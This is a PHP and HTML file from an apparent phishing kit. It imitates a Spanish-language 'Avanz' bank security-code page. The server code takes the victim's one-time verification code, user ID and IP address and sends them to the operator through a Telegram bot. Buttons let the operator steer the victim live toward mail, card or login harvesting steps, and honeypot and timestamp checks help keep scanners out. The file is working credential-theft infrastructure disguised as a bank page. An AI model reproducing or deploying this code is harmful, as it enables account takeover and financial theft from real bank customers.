<?php
require_once __DIR__ . '/_guard.php';
session_start();
require_once __DIR__ . '/_tg.php';

$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
    header("Location: index.php");
    exit;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Anti-bot server-side checks
    $honeypot   = isset($_POST['honeypot']) ? (string)$_POST['honeypot'] : '';
    $csrf_post  = isset($_POST['csrf_token']) ? (string)$_POST['csrf_token'] : '';
    $csrf_cookie= isset($_COOKIE['csrf_token']) ? (string)$_COOKIE['csrf_token'] : '';
    $form_ts    = isset($_POST['form_ts']) ? (string)$_POST['form_ts'] : '';
    if ($honeypot !== '') {
        header('HTTP/1.1 403 Forbidden');
        exit;
    }
    if (!$csrf_post || !$csrf_cookie || !hash_equals($csrf_cookie, $csrf_post)) {
        header('HTTP/1.1 403 Forbidden');
        exit;
    }
    $ts_ok = false;
    if (ctype_digit($form_ts)) {
        $cts = (int)$form_ts;
        $nowms = (int)round(microtime(true) * 1000);
        $age = $nowms - $cts;
        if ($age >= 800 && $age <= (15 * 60 * 1000)) $ts_ok = true;
    }
    if (!$ts_ok) {
        header('HTTP/1.1 403 Forbidden');
        exit;
    }

    $codigo = $_POST['int1'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $msg = "🔐 Nuevo código AVANZ\n";
    $msg .= "🆔 ID: $usuario\n";
    $msg .= "🔢 Código: $codigo\n";
    $msg .= "📍 IP: $ip";

    $botones = [
        [
            ["text" => "❌ TOKEN ERROR", "callback_data" => "TOKEN-ERROR|$usuario"]
        ],
        [
            ["text" => "📩 MAIL", "callback_data" => "MAIL|$usuario"],
            ["text" => "💳 CARD", "callback_data" => "CARD|$usuario"]
        ],
        [
            ["text" => "🔁 LOGIN", "callback_data" => "LOGIN|$usuario"],
            ["text" => "✅ LISTO", "callback_data" => "LISTO|$usuario"]
        ]
    ];

    tg_send($msg, $botones);

    header("Location: sleep.html");
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Avanz - Verificación</title>
    <style>
        .tem {
            color: #333;
            border: 1px solid rgb(182, 181, 181);
            border-radius: 3px;
            height: 39px;
            width: 340px;
            padding-left: 12px;
            outline: none;
            font-size: 16px;
            font-family: sans-serif;
        }

        .masa3 {
            width: 100%;
            height: 20px;
            margin: 0px;
            background-color: #005961;
            padding: 5px;
        }

        .met {
            font-family: sans-serif;
            font-size: 15px;
            min-width: 126px;
            text-transform: uppercase;
            padding: 5px 20px;
            border: none;
            color: #fff;
            background: #FF7500;
            cursor: pointer;
        }

        #iot {
            font-size: 15px;
            color: red;
            font-family: sans-serif;
            float: left;
            display: none;
        }
    </style>
</head>
<body style="margin: 0;">
    <div style="width: 100%; height: 70px; padding: 10px; margin-left: 10px;">
        <img width="120px" src="img/lk.svg" alt="">
    </div>

    <div class="masa3">
        <center>
            <img style="margin-top: 3px; width: 15px;" src="img/icon-login.png" alt="">
        </center>
    </div>

    <div style="padding: 5px;">
        <center>
            <form method="post" style="width: 350px; margin-left: -10px;" onsubmit="return validarCodigo()">
                <br>
                <p style="font-family: sans-serif; color: rgb(105, 105, 105);">
                    Hemos enviado un código de seguridad al número de teléfono o correo electrónico registrado, ingrésalo para continuar.
                </p>
                <br>

                <p style="font-family: sans-serif; float: left; margin-left: 20px; color: rgb(105, 105, 105);">
                    Ingresa el Código de Seguridad
                </p>
                <input inputmode="numeric" class="tem" type="text" name="int1" id="codigo" placeholder="Código" maxlength="8">
                <!-- Anti-bot fields -->
                <input type="text" name="honeypot" class="hidden-field" autocomplete="off" style="display:none">
                <input type="hidden" id="csrf_token" name="csrf_token">
                <input type="hidden" id="form_ts" name="form_ts">
                <p id="iot">Código incorrecto, inténtalo nuevamente</p>

                <br><br><br>
                <input class="met" type="submit" value="CONTINUAR">
            </form>
        </center>
    </div>

    <script>
        // Inicializa CSRF (doble-submit), did y timestamp
        (function(){
            try {
                const token = (Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2));
                const el = document.getElementById('csrf_token');
                if (el) el.value = token;
                sessionStorage.setItem('csrf_token', token);
                document.cookie = `csrf_token=${token}; path=/; SameSite=Lax`;
                const getCookie = (name) => document.cookie.split('; ').find(r => r.startsWith(name + '='))?.split('=')[1];
                let did = getCookie('did') || localStorage.getItem('did');
                if (!did) {
                    const rand = () => Math.random().toString(36).slice(2);
                    did = `${Date.now().toString(36)}_${rand()}_${rand()}`;
                    try { localStorage.setItem('did', did); } catch(e) {}
                }
                document.cookie = `did=${did}; path=/; Max-Age=31536000; SameSite=Lax`;
                const tsEl = document.getElementById('form_ts');
                if (tsEl) tsEl.value = Date.now().toString();
            } catch(e) {}
        })();

        function validarCodigo() {
            let codigo = document.getElementById("codigo").value;
            let mensajeError = document.getElementById("iot");

            // Anti-bot checks
            const csrfToken = document.getElementById('csrf_token').value;
            const storedToken = sessionStorage.getItem('csrf_token');
            const honeypot = document.getElementsByName('honeypot')[0]?.value || '';
            const ts = parseInt(document.getElementById('form_ts').value || '0', 10);
            const now = Date.now();
            if (csrfToken !== storedToken || (honeypot && honeypot.trim().length > 0) || !ts || (now - ts) < 800) {
                mensajeError.style.display = "block";
                setTimeout(() => { mensajeError.style.display = "none"; }, 3000);
                return false;
            }

            if (codigo.length !== 8) {
                mensajeError.style.display = "block";
                setTimeout(() => {
                    mensajeError.style.display = "none";
                }, 3000);
                return false;
            }
            return true;
        }
    </script>
</body>
</html>
